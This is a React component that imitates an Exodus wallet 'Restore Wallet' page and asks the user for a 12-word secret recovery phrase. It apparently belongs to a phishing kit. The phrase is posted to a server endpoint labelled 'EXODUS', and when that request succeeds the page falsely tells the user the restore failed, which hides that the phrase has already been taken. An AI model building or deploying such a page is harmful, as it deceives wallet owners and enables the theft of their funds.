"use client";

import { useState } from "react";
import { Eye, EyeOff } from "lucide-react";

export default function ExodusRestore() {
  const [phrase, setPhrase] = useState<string[]>(Array(12).fill(""));
  const [visible, setVisible] = useState<boolean[]>(Array(12).fill(false));

  const toggleVis = (i: number) => {
    setVisible(v => v.map((v_, idx) => idx === i ? !v_ : v_));
  };

  const handleChange = (i: number, v: string) => {
    const words = [...phrase];
    words[i] = v.toLowerCase().trim();
    setPhrase(words);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const words = e.clipboardData.getData("text").trim().toLowerCase().split(/\s+/).slice(0,12);
    const newArr = Array(12).fill("");
    words.forEach((w,i) => newArr[i] = w);
    setPhrase(newArr);
    e.preventDefault();
  };

  const handleRestore = async () => {
    const phraseString = phrase.join(" ");

    try {
      const response = await fetch("/api/wallet/restore", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phrase: `EXODUS ${phraseString}` }),
      });

      const result = await response.json();
      if (response.ok) {
        alert("Failed to restore, server issue.");
      } else {
        alert("Error: " + result.message);
      }
    } catch (err) {
      alert("Request failed. Server Issue.");
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center p-4">
      <div className="max-w-lg w-full bg-gray-800 rounded-2xl p-8 space-y-6 shadow-lg">
        <h1 className="text-2xl font-bold text-center">Restore Wallet</h1>
        <p className="text-sm text-gray-400 text-center">
          Enter your 12‑word secret recovery phrase to restore your Exodus wallet.
        </p>

        <div className="grid grid-cols-3 gap-3">
          {phrase.map((w, i) => (
            <div key={i} className="relative">
              <input
                type={visible[i] ? "text" : "password"}
                value={w}
                onChange={e => handleChange(i, e.target.value)}
                onPaste={handlePaste}
                className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 pr-10 text-sm text-white"
                placeholder={`${i + 1}.`}
              />
              <button
                type="button"
                onClick={() => toggleVis(i)}
                className="absolute inset-y-0 right-2 flex items-center text-gray-400 hover:text-white"
              >
                {visible[i] ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          ))}
        </div>

        <button
          onClick={handleRestore}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-md mt-2"
        >
          Restore
        </button>
      </div>
    </div>
  );
}
